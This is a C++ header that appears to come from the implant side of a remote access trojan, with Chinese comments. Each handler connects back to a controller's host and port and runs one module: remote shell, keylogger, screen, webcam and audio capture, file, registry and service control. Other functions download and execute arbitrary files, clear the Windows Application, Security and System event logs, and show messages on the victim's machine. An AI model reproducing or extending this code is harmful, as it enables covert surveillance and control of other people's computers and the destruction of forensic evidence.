#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"
#include "VideoManager.h"
#include "AudioManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"
#include "until.h"
#include "install.h"
#include "RegManager.h"
#include "ServersManager.h"
#include "SysInfo.h"
#include <wininet.h>

extern bool g_bSignalHook;

DWORD WINAPI Loop_RegeditManager(SOCKET sRemote)          //注册表管理
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CRegManager	manager(&socketClient);
	
	socketClient.run_event_loop();
	
	return 0;
}

DWORD WINAPI Loop_ServersManager(SOCKET sRemote)          //服务管理
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CServersManager	manager(&socketClient);
	
	socketClient.run_event_loop();
	
	return 0;
}

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CShellManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	manager(&socketClient);

	socketClient.run_event_loop();
	return 0;
}

// 摄像头不同一线程调用sendDIB的问题
DWORD WINAPI Loop_VideoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CVideoManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

typedef UINT (WINAPI *GetSystemDirectoryAT)
(
    __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
    __in UINT uSize
    );
DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CAudioManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}
typedef __out LPSTR (WINAPI *lstrcatAT)
(
    __inout LPSTR lpString1,
    __in    LPCSTR lpString2
    );


DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}


DWORD WINAPI Loop_SysInfoManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSysInfo	manager(&socketClient);
	
	socketClient.run_event_loop();
	
	return 0;
}

DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	const char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;

	if (!http_get(lpURL, lpFileName))
	{
		return false;
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	CreateProcess(NULL, (LPSTR)lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return true;
}


//如果用urldowntofile的话，程序会卡死在这个函数上
bool UpdateServer(LPCTSTR lpURL)
{
	const char	*lpFileName = NULL;
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	if (!http_get(lpURL, lpFileName))
		return false;
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	return CreateProcess(lpFileName, "DJXUP", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}


bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return false;

	// System 权限下不能直接利用shellexecute来执行
	char	*lpSubKey = "Applications\\iexplore.exe\\shell\\open\\command";
	HKEY	hKey;
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strIEPath, &nSize);
	RegCloseKey(hKey);

	if (lstrlen(strIEPath) == 0)
		return false;

	lpstrCat = strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return false;

	lstrcpy(lpstrCat, lpszURL);

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 

	CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return 0;
}

void CleanEvent()
{
	char *strEventName[] = {"Application", "Security", "System"};

	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}

void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpHostID, lstrlen(lpHostID), 0);
}

void SetGroup(LPCTSTR lpServiceName, LPCTSTR lpGroupName)
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ConnectGroup", REG_SZ, (char *)lpGroupName, lstrlen(lpGroupName), 0);
}

////////////////////////////发送消息////////////////////
typedef struct//操作多的  但又可以是一个整体的  比如说人的年龄啊 性别啥的  用个结构体效率高 代码清晰
{
	int counts;
	UINT mark;
	BYTE lpTitle[1024];
    BYTE  lpInfo[1024];
}MsgCom; 


DWORD WINAPI Loop_ShowMsgFun(LPVOID lparam)
{
	MsgCom* comMsg;
	comMsg = (MsgCom*)lparam;
	
	int titleLen;
	int infoLen;
	char* lcTitle = NULL;
	char* lcInfo = NULL;
	
	titleLen = strlen((char*)comMsg->lpTitle);
	if (titleLen == 0)
		return false;;
	lcTitle = (char*)malloc(titleLen + 1);
	infoLen = strlen((char*)comMsg->lpInfo);
	if (infoLen == 0)
		return false;	
	lcInfo = (char*)malloc(infoLen + 1);
	
	memcpy(lcTitle, (char*)comMsg->lpTitle, titleLen+1);
	memcpy(lcInfo, (char*)comMsg->lpInfo, infoLen+1);
	
	
	switch (comMsg->mark)//switch语句效率更高
	{
	case 1:
		MessageBox(0,lcInfo,lcTitle, MB_ICONINFORMATION);
		break;
	case 2:
		MessageBox(0,lcInfo,lcTitle, MB_ICONQUESTION);
		break;
	case 3:
		MessageBox(0,lcInfo,lcTitle, MB_ICONERROR);
		break;
	case 4:
		MessageBox(0,lcInfo,lcTitle, MB_ICONWARNING);
		break;
	}
	free(lcTitle);  //首先释放 malloc开辟的内存空间，然后 让指针指向null
	lcTitle = NULL ;
	free(lcInfo);
	lcInfo = NULL;
	
	
}
DWORD WINAPI Loop_ShowMsg(LPVOID lparam)
{
	MsgCom* comMsg;
	comMsg = (MsgCom*)lparam;
	
	int counti = comMsg->counts;
	
	
	
	for (int i=0; i<counti; i++)
	{
		MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShowMsgFun,(LPVOID)lparam, 0, NULL, true);
		
	}
	
	return true;
}
#endif // !defined(AFX_LOOP_H_INCLUDED)
